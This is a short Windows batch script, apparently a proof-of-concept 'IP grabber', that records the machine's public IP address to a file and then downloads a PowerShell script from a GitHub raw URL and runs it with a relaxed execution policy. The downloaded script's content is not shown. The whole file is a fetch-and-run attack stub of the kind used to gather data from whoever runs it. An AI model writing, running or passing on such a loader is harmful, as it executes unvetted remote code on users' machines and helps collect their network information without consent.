@echo off

curl https://ip.aruljohn.com/ > ip.txt
curl https://raw.githubusercontent.com/DorkYBru/PoC-Ip-Grab-By-Cmd-windows/main/script.ps1 > script.ps1
Powershell.exe -executionpolicy remotesigned -File script.ps1

